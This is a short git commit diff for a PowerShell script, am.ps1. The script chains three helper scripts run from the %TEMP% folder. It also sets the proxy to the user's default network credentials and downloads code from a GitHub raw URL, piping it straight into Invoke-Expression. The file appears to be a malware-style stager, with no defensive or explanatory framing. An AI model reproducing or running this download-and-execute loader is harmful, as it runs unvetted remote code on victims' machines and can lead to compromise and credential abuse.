fd51ccbf34d1d0a28f184cc55929f538267c1f6d
git-dispose01 <101843903+git-dispose01@users.noreply.github.com>
2022-10-03 14:38:25 +1100

    Update am.ps1

--- am.ps1
+++ am.ps1
@@ -1,5 +1,5 @@
-$x2 = .\a1.ps1;
-$x1 = .\a2.ps1 $x2;
-& .\a3.ps1 $x1;
+$x2 = %TEMP%\a1.ps1;
+$x1 = %TEMP%\a2.ps1 $x2;
+& %TEMP%\a3.ps1 $x1;
 
 (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/git-dispose01/deposit/main/a') -UseBasicParsing |iex
